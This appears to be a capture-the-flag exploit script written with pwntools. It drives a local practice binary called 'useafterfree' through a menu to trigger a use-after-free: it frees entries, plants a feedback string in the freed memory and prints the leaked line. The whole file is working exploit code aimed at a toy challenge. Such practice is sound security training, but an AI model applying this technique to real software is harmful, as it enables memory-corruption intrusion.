from pwn import *
import sys, socket

LOCAL=True

BINARY = "./useafterfree"

r = process(BINARY)

for i in range(5):
	r.sendline("2")
	s=r.recvuntil("integers")
	r.sendline("2 1")
	s=r.recvuntil("Exit")

r.sendline("1")
r.recvuntil("integers")
r.sendline("2 1")

r.recvuntil("Exit")
r.sendline("5")
r.recvuntil("feedback:")
r.sendline("$h1k4r1")

r.recvuntil("Exit")
r.sendline("4")
r.recvuntil("integers")
r.sendline("2 1")
r.recvline()
r.recvline()
r.recvline()
s=r.recvline()
print(s)
